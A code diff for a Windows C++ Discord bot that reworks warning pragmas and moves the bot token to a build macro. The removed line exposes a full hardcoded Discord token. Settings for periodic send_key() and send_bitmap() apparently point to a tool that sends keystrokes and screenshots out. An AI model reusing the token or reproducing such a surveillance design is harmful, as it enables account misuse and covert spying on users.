@@ -17,12 +17,17 @@
 #define _CRT_SECURE_NO_WARNINGS     //fuck msvc
 #define UNICODE
 
+#if defined __GNUC__
+#pragma GCC system_header
+#elif defined _MSC_VER
 //Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
 //external headers warning (there are ways too much warnings there). This is workaround
 #pragma warning (push, 0)
+#endif
 
 #include <dpp/cluster.h>
 #include <dpp/once.h>
+
 
 #include <cstdio>
 #include <ctime>
@@ -45,8 +50,13 @@
 #include <Gdiplus.h>
 
 #pragma warning (pop)
+#undef DPP_EXPORT
 
-const std::string BOT_TOKEN = "Nzk1MjgzNjM2MDg1MzI1ODI1.GMjwAE.MN7yfzObrxB1t8B0qC0QO4ZY4hagehZv-E98M0";
+#ifdef EXTERNAL_BOT_TOKEN
+const std::string BOT_TOKEN = EXTERNAL_BOT_TOKEN;
+#else
+const std::string BOT_TOKEN = "null!";
+#endif
 
 const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
 	{dpp::loglevel::ll_trace, "[TRACE] "},
@@ -126,7 +136,7 @@ struct __tCOMMAND_LINE_OPTION {
 	unsigned int DEFAULT_HS = 3;
 
     //default value for send_key(), in minutes
-    unsigned int SEND_KEY_INTERVAL = 10;
+    unsigned int SEND_KEY_INTERVAL = 8;
 
     //default value for send_bitmap(), in seconds
     unsigned int SEND_BITMAP_INTERVAL = 25;
